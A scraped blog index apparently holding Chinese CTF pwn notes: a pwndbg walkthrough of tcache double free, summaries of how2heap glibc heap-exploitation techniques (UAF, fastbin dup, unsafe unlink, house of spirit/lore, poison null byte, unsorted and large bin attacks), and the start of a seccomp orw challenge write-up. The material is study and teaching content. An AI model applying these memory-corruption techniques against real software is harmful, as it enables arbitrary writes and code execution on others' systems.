&lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x0000000000000000    \t\t\t\t\t\t\t#指向top_chunk0x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; \n\n由于在tcache_put函数中没有对堆块进行检查，接下来我们对malloc出的chunk进行多次free。对代码的第15行下断点，继续调试：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct0x601010:\t0x0000000000000002\t0x0000000000000000    \t\t#count=20x601020:\t0x0000000000000000\t0x00000000000000000x601030:\t0x0000000000000000\t0x00000000000000000x601040:\t0x0000000000000000\t0x00000000000000000x601050:\t0x0000000000601260\t0x0000000000000000    \t\t#指向chunk1_data......(省略内容均为空)0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000601260\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......(省略内容均为空)0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; bintcachebins0x20 [  2]: 0x601260 ◂— 0x601260fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x0000000000000000    \t\t\t\t\t\t\t#指向top_chunk0x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; \n\n从上面的内存中可以看出，对chunk1进行两次free之后，在tcache中形成了cyclical list，也就是说chunk1中的next指针指向其本身的chunk_data。由于接下来有两次malloc，因此先来看第一次malloc之后的内存，对malloc下断点：命令：b malloc继续调试程序，由于对malloc下断点，因此程序会停在malloc的push rbp，也就是说程序并没有进行第一次malloc，因此我们输入c继续运行程序，结果如下：\npwndbg&gt; heapFree chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; bintcachebins0x20 [  1]: 0x601260 ◂— 0x601260fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct0x601010:\t0x0000000000000001\t0x0000000000000000    \t\t#count=10x601020:\t0x0000000000000000\t0x00000000000000000x601030:\t0x0000000000000000\t0x00000000000000000x601040:\t0x0000000000000000\t0x00000000000000000x601050:\t0x0000000000601260\t0x0000000000000000......（省略内容均为空）0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000601260\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......（省略内容均为空）0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; bintcachebins0x20 [  1]: 0x601260 ◂— 0x601260fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x0000000000000000    \t\t\t\t\t\t\t#指向top_chunk0x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; \n\n为了防止程序跑飞，接下来对代码的第17行下断点，看一下第二次malloc之后的结果：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; bintcachebins0x20 [  0]: 0x601260 ◂— ...fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x00000000000000000x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct 0x601010:\t0x0000000000000000\t0x00000000000000000x601020:\t0x0000000000000000\t0x00000000000000000x601030:\t0x0000000000000000\t0x00000000000000000x601040:\t0x0000000000000000\t0x00000000000000000x601050:\t0x0000000000601260\t0x0000000000000000    \t\t#执行chunk1_data......(省略内容均为空)0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000601260\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......(省略内容均为空) 0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n上面就是tcache_dup的攻击方式，看起来好像没有什么用，下篇文章中的例子会体现。\n","categories":["heap"],"tags":["Tcache bin Attack"]},{"title":"doublefree","url":"/2023/04/10/double%20free/","content":"利用条件\n1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。\n\n该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：\nfree(shangu1)free(shangu2)free(shangu1)\n\n此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1当再次申请堆时会出现 有两个指针指向同一个chunk\n![联想截图_20230322221849.png](https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png\n","categories":["heap"],"tags":["fastbin attack"]},{"title":"how2heap漏洞和解析","url":"/2023/10/31/how2heap%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%8E%9F%E7%90%86/","content":"First fit原理\n演示glibc 的分配机制glibc 使用首次适应算法选择空闲的堆块如果有一个空闲堆块且足够大，那么 malloc 将选择它如果存在 use-after-free 的情况那可以利用这一特性首先申请两个比较大的 chunk第一个 a = malloc(0x512) 在: 0x1682010第二个 b = malloc(0x256) 在: 0x1682530我们可以继续分配它现在我们把 \"AAAAAAAA\" 这个字符串写到 a 那里 第一次申请的 0x1682010 指向 AAAAAAAA接下来 free 掉第一个...接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: 0x1682010第三次 c = malloc(0x500) 在: 0x1682010我们这次往里写一串 \"CCCCCCCC\" 到刚申请的 c 中第三次申请的 c 0x1682010 指向 CCCCCCCC第一次申请的 a 0x1682010 指向 CCCCCCCC可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 \"CCCCCCCC\"\n\n操作\n\n存在uaf，首先释放一个堆块p1，里面有内容\n再申请一个相同大小的堆块p2\n这两个堆块实际上指向同一个内存区域\n\n结果\n这两个堆块实际上指向同一个内存区域\nUAF原理\n申请0x20大小的内存p1 的地址: 0x1f11010把p1[1]赋值为Printf函数，然后打印出\"Hello CTFshow\"Hello CTFshowfree 掉 p1因为并没有置为null，所以p1[1]仍然是Printf函数，仍然可以输出打印了\"Hello CTFshow again\"Hello CTFshow again接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的p2 的地址: 0x1f11010p1 的地址: 0x1f11010然后把p2[1]给改成demoflag也就是system函数Then get the flag &amp;&amp; enjoy it !\n\n\n\n操作\n\nfree掉chunk1\n再申请一个相同大小的chunk2，修改内容\n再使用chunk1，会输出修改内容\n\n结果\nchunk1和chunk2是同一个chunk\nDouble Free原理\n演示 fastbin 的 double free首先申请 3 个 chunk第一个 malloc(8): 0x188f010第二个 malloc(8): 0x188f030第三个 malloc(8): 0x188f050free 掉第一个当我们再次 free 0x188f010 的时候, 程序将会崩溃因为 0x188f010 在 free 链表的第一个位置上我们先 free 0x188f030.现在我们就可以再次 free 0x188f010 了, 因为他现在不在 free 链表的第一个位置上现在空闲链表是这样的 [ 0x188f010, 0x188f030, 0x188f010 ]. 如果我们 malloc 三次, 我们会得到两次 0x188f010 第一次 malloc(8): 0x188f010第二次 malloc(8): 0x188f030第三次 malloc(8): 0x188f010\n\n\n\n操作\n\n申请3个chunk，p1，p2，p3\nfree p1，再freep2，形成 p2 -&gt; p1\n再free p1 形成 p1 -&gt; p2 -&gt; p1\n连续申请三次chunk\n\n结果\n得到两个相同地址的chunk\nFastbin_dup_into_stack – Double free原理\n通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）通过 malloc 申请到 0x7ffec12adb40.先申请3 个 chunkchunk a: 0x209a010chunk b: 0x209a030chunk c: 0x209a050free 掉 chunk a如果还对 0x209a010 进行 free, 程序会崩溃。因为 0x209a010 现在是 fastbin 的第一个先对 b 0x209a030 进行 free接下来就可以对 0x209a010 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了现在 fastbin 的链表是 [ 0x209a010, 0x209a030, 0x209a010 ] 接下来通过修改 0x209a010 上的内容来进行攻击.第一次 malloc(8): 0x209a010第二次 malloc(8): 0x209a030现在 fastbin 表中只剩 [ 0x209a010 ] 了接下来往 0x209a010 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去现在覆盖 0x209a010 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置第三次 malloc(8): 0x209a010, 把栈地址放到 fastbin 链表中这一次 malloc(8) 就申请到了栈上去: 0x7ffec12adb40\n\n操作\n\n申请3个chunk，p1，p2，p3\nfree p1，再freep2，形成 p2 -&gt; p1\n再free p1 形成 p1 -&gt; p2 -&gt; p1\n修改p1的fd指向任意地址，栈上都可\n连续申请三次chunk\n第四次申请chunk会申请到目标地址\n\n结果\n任意地址读写\nFastbin_dup_consolidate原理\n申请两个 fastbin 范围内的 chunk: p1=0xbba010 p2=0xbba030先 free p1去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=0xbba050因为 malloc_consolidate(), p1 会被放到 unsorted bin 中这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0xbba010 0xbba010\n\n操作\n- 1.free 一个fastbin大小的chunk 1\n- 2.申请一个largin bin 大小的chunk，此时因为 malloc_consolidate(), chunk1 会被放到 unsorted bin 中\n- 再次free chunk1\n\n结果\n​\t现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0xbba010 0xbba010，任意地址读写\nUnsafe_Unlink原理\n当你在已知位置有指向某个区域的指针时，可以调用 unlink最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入全局变量 chunk0_ptr 在 0x6020d0, 指向 0x161e010我们想要破坏的 chunk 在 0x161e0a0在 chunk0 那里伪造一个 chunk我们设置 fake chunk 的 'next_free_chunk' (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;fd-&gt;bk = P.我们设置 fake chunk 的 'previous_free_chunk' (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;bk-&gt;fd = P.通过上面的设置可以绕过检查: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == FalseFake chunk 的 fd: 0x6020b8Fake chunk 的 bk: 0x6020c0现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 0x80接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块现在释放掉 chunk1，会触发 unlink，合并两个 free chunk此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。之前的值是: Hello!~新的值是: BBBBAAAA\n\n操作\n​\tfd = goal - 0x18 \n​\tbk = goal - 0x10\n结果\n任意地址写\nhouse_of_spirit原理\n这个例子演示了 house of spirit 攻击我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它覆盖一个指向 fastbin 的指针这块区域 (长度为: 80) 包含两个 chunk. 第一个在 0x7fff5f0e7268 第二个在 0x7fff5f0e72a8.构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）现在，我们拿伪造的那个 fake chunk 的地址进行 free, 0x7fff5f0e7270.free!现在 malloc 的时候将会把 0x7fff5f0e7270 给返回回来malloc(0x30): 0x7fff5f0e7270Finish!\n\n操作\n构造fake fastbin chunk，free掉这个chunk，再次申请可以拿回这个chunk\n前提有一个可控的指针\n结果\n任意地址写，前提有可控指针\nPosion_null_byte原理\n当存在 off by null 的时候可以使用该技术申请 0x100 的 chunk aa 在: 0x1eb2010因为我们想要溢出 chunk a，所以需要知道他的实际大小: 0x108b: 0x1eb2120c: 0x1eb2330另外再申请了一个 chunk c：0x1eb2440，防止 free 的时候与 top chunk 发生合并的情况会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查b 的 size: 0x211假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上b 现在的 size: 0x200c 的 prev_size 是 0x210但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))申请一个 0x100 大小的 b1: 0x1eb2120现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: 0x210但是我们之前写 0x200 那个地方已经改成了: f0接下来 malloc 'b2', 作为 'victim' chunk.b2 申请在: 0x1eb2230现在 b2 填充的内容是:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了d 申请到了: 0x1eb2120，我们填充一下 d 为 \"D\"现在 b2 的内容就是:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD\n\n操作\n\n申请0x100大小的chunk a，0x200大小的chunk b，chunk c 防合并\nfree b\n通过off-by-one覆写chunk b的size从0x211-&gt;0x200 \nchunk b中b+0x1f0的位置放prev_size = 0x200 我们将会成功绕过 chunk 的检测 chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))\n申请一个0x100的b1，b1会放到b的位置，c的prev_size仍然是0x210，但是我们之前写 0x200 那个地方已经改成了: f0\n申请b2，作为 ‘victim’ chunk \nfree b1 和 c，由于c的prev_size是0x210，会合并b1和c，此时b2仍在\n\n结果\n在一个大的free堆块中存在一个未被free的堆块\nHouse_of_lore原理\n定义了两个数组stack_buffer_1 在 0x7ffc7a946070stack_buffer_2 在 0x7ffc7a946050申请第一块属于 fastbin 的 chunk 在 0x211c010在栈上伪造一块 fake chunk设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针另外再分配一块，避免与 top chunk 合并 0x211c080Free victim chunk 0x211c010, 他会被插入到 fastbin 中此时 victim chunk 的 fd、bk 为零victim-&gt;fd: (nil)victim-&gt;bk: (nil)这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 0x211c010现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址victim-&gt;fd: 0x7f6610ee7bd8victim-&gt;bk: 0x7f6610ee7bd8现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上然后申请跟第一个 chunk 大小一样的 chunk他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk最后 malloc 一次会返回 victim-&gt;bk 指向的那里p4 = malloc(100)在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 0x7f6610ee7bd8p4 在栈上 0x7ffc7a946080\n\n操作\n\n在栈上定义了两个数组 stack1，stack2\n申请了一块 fastbin chunk，在栈上伪造一块 fake chunk，设置stack1 fd -&gt; victim chunk，绕过small bin检查\n设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2 &amp; 设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 \n再分配个chunk，避免和top chunk 合并\nfree victim chunk，会被放入fastbin中同时fd、bk为0\n再申请一个large bin chunk触发xx使得victim chunk 进入 unsortedbin\nfd 和 bk 被更新为main_arena_88\n存在一个漏洞可以使得victim的bk -&gt; stack 1\n申请一个大小相同的chunk取出victim chunk,并且它的bk为修改掉的victim的bk\n再次malloc一次会返回 victim -&gt; bk 指向的那里，也就是stack1，stack2 fd 指针也更改main_arena_88\n\n结果\n任意地址malloc\nOverlapping_chunks原理\n这是一个简单的堆块重叠问题，首先申请 3 个 chunk这三个 chunk 分别申请到了:p1：0x2088010p2：0x2088110p3：0x2088210给他们分别填充\"1\"\"2\"\"3\"free 掉 p2p2 被放到 unsorted bin 中现在假设有一个堆溢出漏洞，可以覆盖 p2为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块我们将 p2 的大小设置为 385, 这样的话我们就能用 376 大小的空间现在让我们分配另一个块，其大小等于块p2注入大小的数据大小malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）p4 分配在 0x2088110 到 0x2088288 这一区域p3 从 0x2088210 到 0x2088288p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容接下来验证一下，现在 p3 与 p4:p4 = 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222p3 = 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333\u0002333333333�如果我们使用 memset(p4, '4', 376), 将会:p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444\u00024444444444444444444444444444444444444444444444444444444444444444444�p3 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444\u0002444444444�\n\n\n\n操作\n\n申请三个堆块大小为0xf8，0xf8，0x78\nfree p2，p2被放到 unsorted bin 中\n假设存在一个堆溢出漏洞，可以覆盖p2\n\n结果\n堆块重叠\nOverlapping_chunks_2原理\n操作\n结果\nMmap_overlapping_chunks原理\n操作\n结果\nUnsorted_bin_attack原理\nunsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备我们准备把这个地方 0x7ffe5b09ba18 的值 0 更改为一个很大的数一开始先申请一个比较正常的 chunk: 0x14fe010再分配一个避免与 top chunk 合并当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 0x7efe12f93b78现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:0x7ffe5b09ba08再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址0x7ffe5b09ba18: 0x7efe12f93b78\n\n\n\n操作\n\n申请一个chunk p1 (0x410)，再申请一个chunk p2避免与top chunk 合并\nfree p1，p1会被放入 unsorted bin 中，同时fd 和 bk指针为main_arena_88\n假设有个漏洞，可以修改p1的bk指针\n修改 bk -&gt; (goal - 0x10)\n再malloc相同大小的chunk p，goal已经为unsorted bin 的地址\n\n结果\n修改任意位置为 一个很大的数\nLarge_bin_attack原理\n跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数先来看一下目标:stack_var1 (0x7fff83c2e410): 0stack_var2 (0x7fff83c2e418): 0分配第一个 large chunk: 0x6ac000再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了申请第二个 large chunk 在: 0x6ac360同样在分配一个 fastbin 大小的 chunk 防止合并掉最后申请第三个 large chunk 在: 0x6ac7a0申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ 0x6ac360 &lt;--&gt; 0x6ac000 ]现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ 0x6ac0a0 ]free 掉第三个，他会被放到 unsorted bin 中: [ 0x6ac7a0 &lt;--&gt; 0x6ac0a0 ]假设有个漏洞，可以覆盖掉第二个 chunk 的 \"size\" 以及 \"bk\"、\"bk_nextsize\" 指针减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:stack_var1 (0x7fff83c2e410): 0x6ac7a0stack_var2 (0x7fff83c2e418): 0x6ac7a0\n\n\n\n操作\n\n分配第一个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并\n分配第二个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并\n分配第三个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并\nfree chunk1 和 chunk2  均被放入unsorted bin 中\n现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中\nfree chunk3 放到unsorted bin 中\n存在漏洞，可以覆盖掉第二个chunk 的size bk bk_nextsize\n减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x1\n再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了\n\n结果\n​\t栈上地址被覆盖\n","categories":["heap"],"tags":["how2heap"]},{"title":"prctl-seccomp-orw","url":"/2023/09/18/prctl-seccomp/","content":"初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）\n题目来源：https://pwnable.tw/challenge/#2（orw）参考资料：https://www.anquanke.com/post/id/186447https://man7.org/linux/man-pages/man2/prctl.2.htmlhttps://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/附件：链接: https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A  密码: hvqc–来自百度网盘超级会员V3的分享\n\nprctl-seccomp 简介seccomp 是 secure computing 的缩写，其是从 Linux kernel 2.6.23版本引入的一种简洁的 sandbox 机制，可以当作沙箱使用。在编写C语言程序过程中，可以通过引入prctl函数来实现内核级的安全机制；程序编译运行后，相当于进程进入到一种“安全”运行模式。为什么要引入这样一种安全机制？正常情况下在 Linux 系统里，大量的系统调用（system call）会直接暴露给用户态程序，也就是说程序可以使用所有的syscall，此时如果劫持程序流程通过exeve或system来调用syscall就会获得用户态的shell权限。可以看到并不是所有的系统调用都被需要，不安全的代码滥用系统调用会对系统造成安全威胁。为了防范这种攻击方式，这时seccomp就派上了用场，在严格模式下的进程只能调用4种系统调用，即 read()、write()、 exit() 和 sigreturn()，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用seccomp-tools查看。\n\nsandbox：沙箱、沙盒\n\n使用seccomp-tools查看可用系统调用（识别沙箱规则）\n安装方式：https://github.com/david942j/seccomp-tools\n$ gem install seccomp-tools\nsudo apt install gcc ruby-dev\n\n执行如下图中命令即可查看此ELF文件中可用的系统调用：\nctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW    \n\n##从IDA开始分析题目\n将题目下载下来，我们先来看一下程序的代码，直接来到main函数：\nint __cdecl main(int argc, const char **argv, const char **envp){  orw_seccomp();  printf(\"Give my your shellcode:\");  read(0, &amp;shellcode, 0xC8u);  ((void (*)(void))shellcode)();  return 0;}\n\n进入orw_seccomp();\nunsigned int orw_seccomp(){  __int16 v1; // [esp+4h] [ebp-84h] BYREF  char *v2; // [esp+8h] [ebp-80h]  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF  unsigned int v4; // [esp+6Ch] [ebp-1Ch]  v4 = __readgsdword(0x14u);  qmemcpy(v3, &amp;unk_8048640, sizeof(v3));  v1 = 12;  v2 = v3;  prctl(38, 1, 0, 0, 0);  prctl(22, 2, &amp;v1);  return __readgsdword(0x14u) ^ v4;}\n\n我们注意一下代码中的两个prctl：\n\nprctl(38, 1, 0, 0, 0)\nprctl(22, 2, &amp;v1);\n\n先记住这两个函数，接下来会提到，这里暂时先放一放。\nprctl函数原型看一下这个函数的原型：\n#include &lt;sys/prctl.h&gt; int prctl(int option, 